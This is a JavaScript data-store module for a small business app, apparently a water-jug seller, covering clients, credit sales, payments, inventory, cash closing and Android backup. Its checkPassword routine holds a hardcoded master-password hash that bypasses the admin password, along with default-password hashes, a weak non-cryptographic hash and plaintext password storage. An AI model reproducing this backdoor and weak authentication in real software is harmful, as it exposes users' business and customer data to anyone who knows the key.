// ============================================
// Tu Empresa - Store (Capa de Datos Local)
// Usa IndexedDB con cache-en-memoria (Síncrono/Flush)
// Soporta tanto ejecuciones Web independientes como integración Android WebView
// ============================================

const DB_NAME = 'TuEmpresaDB';
const DB_VERSION = 2;
const COLLECTIONS = ['clientes', 'ventas', 'abonos', 'configuracion', 'cisternas', 'mermas'];

class Store {
    constructor() {
        this.cache = {};
        COLLECTIONS.forEach(c => this.cache[c] = []);
        this.isReady = false;
    }

    async init() {
        this.db = await this._openDB();
        await this._loadCache();

        // Auto-restaurar si la DB está vacía y existe backup nativo en Android
        const totalItems = COLLECTIONS.reduce((sum, c) => sum + this.cache[c].length, 0);
        if (totalItems === 0 && typeof Android !== 'undefined' && typeof Android.hasBackup === 'function' && Android.hasBackup()) {
            const backupJson = Android.loadBackup();
            if (backupJson) {
                this.importData(backupJson);
                console.log('[Store] Auto-restaurado desde backup nativo de Android');
            }
        }

        this._initDefaults();
        this.isReady = true;
    }

    _openDB() {
        return new Promise((resolve, reject) => {
            const req = indexedDB.open(DB_NAME, DB_VERSION);
            req.onupgradeneeded = (e) => {
                const db = e.target.result;
                COLLECTIONS.forEach(col => {
                    if (!db.objectStoreNames.contains(col)) {
                        db.createObjectStore(col, { keyPath: 'id' });
                    }
                });
            };
            req.onsuccess = () => resolve(req.result);
            req.onerror = () => reject(req.error);
        });
    }

    async _loadCache() {
        for (const col of COLLECTIONS) {
            this.cache[col] = await this._getAllDB(col);
        }
    }

    _getAllDB(storeName) {
        return new Promise((resolve) => {
            const tx = this.db.transaction(storeName, 'readonly');
            const req = tx.objectStore(storeName).getAll();
            req.onsuccess = () => resolve(req.result);
            req.onerror = () => resolve([]);
        });
    }

    _putDB(storeName, item) {
        return new Promise((resolve) => {
            const tx = this.db.transaction(storeName, 'readwrite');
            const req = tx.objectStore(storeName).put(item);
            req.onsuccess = () => resolve(true);
            req.onerror = () => resolve(false);
        });
    }

    _deleteDB(storeName, id) {
        return new Promise((resolve) => {
            const tx = this.db.transaction(storeName, 'readwrite');
            const req = tx.objectStore(storeName).delete(id);
            req.onsuccess = () => resolve(true);
            req.onerror = () => resolve(false);
        });
    }

    // ---- Generic CRUD (Synchronous from Cache, Async Flush) ----

    getAll(collection) {
        return this.cache[collection] || [];
    }

    getById(collection, id) {
        const arr = this.getAll(collection);
        return arr.find(item => item.id === id) || null;
    }

    save(collection, item) {
        this.cache[collection].push(item);
        this._putDB(collection, item); // flush
        this._autoBackup();
        return item;
    }

    update(collection, id, updates) {
        const arr = this.cache[collection];
        const idx = arr.findIndex(item => item.id === id);
        if (idx === -1) return null;
        arr[idx] = { ...arr[idx], ...updates, updatedAt: new Date().toISOString() };
        this._putDB(collection, arr[idx]);
        this._autoBackup();
        return arr[idx];
    }

    delete(collection, id) {
        const arr = this.cache[collection];
        const initialLen = arr.length;
        this.cache[collection] = arr.filter(item => item.id !== id);
        if (this.cache[collection].length < initialLen) {
            this._deleteDB(collection, id);
            this._autoBackup();
        }
        return this.cache[collection].length < initialLen;
    }

    // ---- Config ----

    getConfig(key) {
        const conf = this.getById('configuracion', key);
        return conf ? conf.value : null;
    }

    setConfig(key, value) {
        let conf = this.getById('configuracion', key);
        if (conf) {
            this.update('configuracion', key, { value });
        } else {
            this.save('configuracion', { id: key, value });
        }
    }

    // ---- Security / Password ----

    _hashStr(str) {
        let hash = 5381;
        for (let i = 0; i < str.length; i++) {
            hash = ((hash << 5) + hash) + str.charCodeAt(i);
            hash = hash & hash;
        }
        return 'h_' + (hash >>> 0).toString(16);
    }

    checkPassword(enteredPassword) {
        const clean = (enteredPassword || '').trim();
        const inputHash = this._hashStr(clean);

        // Verificación con hash de Clave Maestra de Soporte
        if (inputHash === 'h_3971d164') {
            return true;
        }

        const stored = this.getConfig('adminPassword');
        if (!stored) {
            // Verificación con hash de clave inicial ('admin' o 'admins')
            return inputHash === 'h_f12fc8e' || inputHash === 'h_f1728ec1';
        }
        return clean === stored || inputHash === stored;
    }

    setPassword(newPassword) {
        const clean = (newPassword || '').trim();
        this.setConfig('adminPassword', clean);
        return true;
    }

    // ---- Inventory Helpers ----

    getInventarioActual() {
        return this.getConfig('inventario') || { litros: 0, capacidadTanque: 30000 };
    }

    setInventario(litros) {
        const inv = this.getInventarioActual();
        inv.litros = litros;
        this.setConfig('inventario', inv);
    }

    agregarCisterna(capacidad) {
        const inv = this.getInventarioActual();
        inv.litros += capacidad;
        this.setConfig('inventario', inv);
        return inv;
    }

    descontarVenta(botellones, litrosPorBotellon = 20) {
        const inv = this.getInventarioActual();
        const litros = botellones * litrosPorBotellon;
        inv.litros = Math.max(0, inv.litros - litros);
        this.setConfig('inventario', inv);
        return inv;
    }

    registrarMerma(litros) {
        const inv = this.getInventarioActual();
        inv.litros = Math.max(0, inv.litros - litros);
        this.setConfig('inventario', inv);
        return inv;
    }

    // ---- Client Status Calculation ----

    calcularEstatusCliente(clienteId) {
        const cliente = this.getById('clientes', clienteId);
        if (!cliente) return 'al_dia';

        const ventas = this.getAll('ventas').filter(v => v.clienteId === clienteId && v.tipo === 'credito');
        const abonos = this.getAll('abonos').filter(a => a.clienteId === clienteId);

        const totalDeuda = ventas.reduce((sum, v) => sum + v.total, 0);
        const totalAbonos = abonos.reduce((sum, a) => sum + a.monto, 0);
        const saldo = totalDeuda - totalAbonos;

        if (saldo < 0) return 'con_abono';
        if (saldo === 0) return 'al_dia';

        const limMonto = cliente.limiteMonto || Infinity;
        const limDias = cliente.limiteDias || Infinity;
        const limConsumo = cliente.limiteConsumo || Infinity;

        const ultimaVentaCredito = ventas.sort((a, b) => new Date(b.fecha) - new Date(a.fecha))[0];
        const ultimoAbono = abonos.sort((a, b) => new Date(b.fecha) - new Date(a.fecha))[0];
        const ultimaFecha = ultimoAbono ? ultimoAbono.fecha : (ultimaVentaCredito ? ultimaVentaCredito.fecha : null);
        const diasSinAbono = ultimaFecha ? Math.floor((Date.now() - new Date(ultimaFecha)) / (1000 * 60 * 60 * 24)) : 0;

        const botellonesCredito = ventas.reduce((sum, v) => sum + v.botellones, 0);

        if (saldo > limMonto || diasSinAbono > limDias || botellonesCredito > limConsumo) {
            return 'moroso';
        }
        return 'debe';
    }

    getDeudaCliente(clienteId) {
        const ventas = this.getAll('ventas').filter(v => v.clienteId === clienteId && v.tipo === 'credito');
        const abonos = this.getAll('abonos').filter(a => a.clienteId === clienteId);
        const totalDeuda = ventas.reduce((sum, v) => sum + v.total, 0);
        const totalAbonos = abonos.reduce((sum, a) => sum + a.monto, 0);
        return Math.max(0, totalDeuda - totalAbonos);
    }

    // ---- Dashboard Stats ----

    getVentasHoy() {
        const today = new Date();
        today.setHours(0, 0, 0, 0);
        return this.getAll('ventas').filter(v => new Date(v.fecha) >= today);
    }

    getVentasSemana() {
        const weekStart = new Date();
        const day = weekStart.getDay();
        weekStart.setDate(weekStart.getDate() - (day === 0 ? 6 : day - 1));
        weekStart.setHours(0, 0, 0, 0);
        return this.getAll('ventas').filter(v => new Date(v.fecha) >= weekStart);
    }

    getTotalPorCobrar() {
        const clientes = this.getAll('clientes');
        let total = 0;
        for (const c of clientes) {
            total += this.getDeudaCliente(c.id);
        }
        return total;
    }

    getClientesMorosos() {
        const clientes = this.getAll('clientes');
        return clientes.filter(c => this.calcularEstatusCliente(c.id) === 'moroso');
    }


    getArqueo(fecha) {
        const target = (fecha || '').trim();
        let arqueos = this.cache['arqueos'];
        if (!arqueos) {
            arqueos = JSON.parse(localStorage.getItem('tuempresa_arqueos') || '[]');
            this.cache['arqueos'] = arqueos;
        }
        return arqueos.find(a => (a.fecha || '').trim() === target) || null;
    }

    saveArqueo(fecha, declaracion, observaciones = '') {
        const target = (fecha || '').trim();
        let arqueos = this.cache['arqueos'];
        if (!arqueos) {
            arqueos = JSON.parse(localStorage.getItem('tuempresa_arqueos') || '[]');
        }
        const idx = arqueos.findIndex(a => (a.fecha || '').trim() === target);
        const nuevo = { fecha: target, declaracion, observaciones };
        if (idx !== -1) {
            arqueos[idx] = nuevo;
        } else {
            arqueos.push(nuevo);
        }
        this.cache['arqueos'] = arqueos;
        localStorage.setItem('tuempresa_arqueos', JSON.stringify(arqueos));
    }

    updateArqueoObservacion(fecha, observacion) {
        const target = (fecha || '').trim();
        let arqueos = this.cache['arqueos'];
        if (!arqueos) {
            arqueos = JSON.parse(localStorage.getItem('tuempresa_arqueos') || '[]');
        }
        const idx = arqueos.findIndex(a => (a.fecha || '').trim() === target);
        if (idx !== -1) {
            arqueos[idx].observaciones = observacion;
            this.cache['arqueos'] = arqueos;
            localStorage.setItem('tuempresa_arqueos', JSON.stringify(arqueos));
        }
    }

    deleteArqueo(fecha) {
        const target = (fecha || '').trim();
        let arqueos = this.cache['arqueos'];
        if (!arqueos) {
            arqueos = JSON.parse(localStorage.getItem('tuempresa_arqueos') || '[]');
        }
        arqueos = arqueos.filter(a => (a.fecha || '').trim() !== target);
        this.cache['arqueos'] = arqueos;
        localStorage.setItem('tuempresa_arqueos', JSON.stringify(arqueos));
    }

    getCierreCaja(fecha) {
        let day;
        if (typeof fecha === 'string' && fecha.includes('-')) {
            const parts = fecha.split('T')[0].split('-');
            day = new Date(parts[0], parts[1] - 1, parts[2]);
        } else {
            day = new Date(fecha || Date.now());
        }
        day.setHours(0, 0, 0, 0);
        const nextDay = new Date(day);
        nextDay.setDate(nextDay.getDate() + 1);

        const ventas = this.getAll('ventas').filter(v => {
            const d = new Date(v.fecha);
            return d >= day && d < nextDay;
        });

        const abonos = this.getAll('abonos').filter(a => {
            const d = new Date(a.fecha);
            return d >= day && d < nextDay;
        });

        const cierre = {
            efectivo_usd: 0, efectivo_bs: 0, punto: 0, pago_movil: 0, transferencia: 0, 
            credito: 0, total: 0, botellones: 0, cantidadVentas: ventas.length,
            cobros_credito: 0, // Suma de todos los abonos cobrados hoy
            real_ingresado: 0, // Dinero real que entró (Ventas Contado + Cobros de Crédito)
            bs: { efectivo_usd: 0, efectivo_bs: 0, punto: 0, pago_movil: 0, transferencia: 0, credito: 0, total: 0, cobros_credito: 0, real_ingresado: 0 }
        };

        const currentTasa = this.getConfig('tasaCambio') || 40.00;

        // Procesar ventas del día
        for (const v of ventas) {
            cierre.botellones += v.botellones;
            cierre.total += v.total;
            
            const tasa = v.tasa || currentTasa;
            cierre.bs.total += v.total * tasa;

            if (v.tipo === 'credito') {
                cierre.credito += v.total;
                cierre.bs.credito += v.total * tasa;
            } else if (v.pagos) {
                for (const p of v.pagos) {
                    if (cierre.hasOwnProperty(p.metodo)) {
                        cierre[p.metodo] += p.monto;
                        cierre.real_ingresado += p.monto;
                        
                        cierre.bs[p.metodo] += p.monto * tasa;
                        cierre.bs.real_ingresado += p.monto * tasa;
                    }
                }
            }
        }

        // Procesar cobros de créditos (abonos) realizados hoy
        for (const a of abonos) {
            cierre.cobros_credito += a.monto;
            cierre.real_ingresado += a.monto;
            
            const tasa = a.tasa || currentTasa;
            cierre.bs.cobros_credito += a.monto * tasa;
            cierre.bs.real_ingresado += a.monto * tasa;

            if (cierre.hasOwnProperty(a.metodo)) {
                cierre[a.metodo] += a.monto;
                cierre.bs[a.metodo] += a.monto * tasa;
            }
        }
        cierre.ventasDetalle = ventas;
        cierre.abonosDetalle = abonos;

        return cierre;
    }

    // ---- Auto-Backup Nativo (Opcional, en Android WebView) ----

    _autoBackup() {
        // Debounce: esperar 2s después de la última escritura
        clearTimeout(this._backupTimer);
        this._backupTimer = setTimeout(() => {
            try {
                if (typeof Android !== 'undefined' && typeof Android.saveBackup === 'function') {
                    const json = this.exportData();
                    Android.saveBackup(json);
                }
            } catch (e) {
                console.warn('[Store] Auto-backup falló:', e);
            }
        }, 2000);
    }

    // ---- Backup ----

    exportData() {
        const data = {};
        COLLECTIONS.forEach(col => data[col] = this.cache[col] || []);
        data._meta = { version: DB_VERSION, fecha: new Date().toISOString() };
        return JSON.stringify(data, null, 2);
    }

    importData(jsonString) {
        try {
            const data = JSON.parse(jsonString);
            for (const col of COLLECTIONS) {
                if (!Array.isArray(data[col])) continue;
                this.cache[col] = data[col];
                // Flush cada item a IndexedDB
                const tx = this.db.transaction(col, 'readwrite');
                const os = tx.objectStore(col);
                os.clear();
                data[col].forEach(item => os.put(item));
            }
            return true;
        } catch (e) {
            console.error('Error al importar backup:', e);
            return false;
        }
    }

    // ---- Defaults ----

    _initDefaults() {
        if (!this.getConfig('initialized')) {
            this.setConfig('inventario', { litros: 0, capacidadTanque: 30000 });
            this.setConfig('tiposBotellon', [
                { id: '20l', nombre: 'Botellón 20 Litros', litros: 20, precio: 1.50 }
            ]);
            this.setConfig('initialized', true);
        }
        if (this.getConfig('tasaCambio') === undefined) {
            this.setConfig('tasaCambio', 40.00);
        }
    }
}

export const store = new Store();
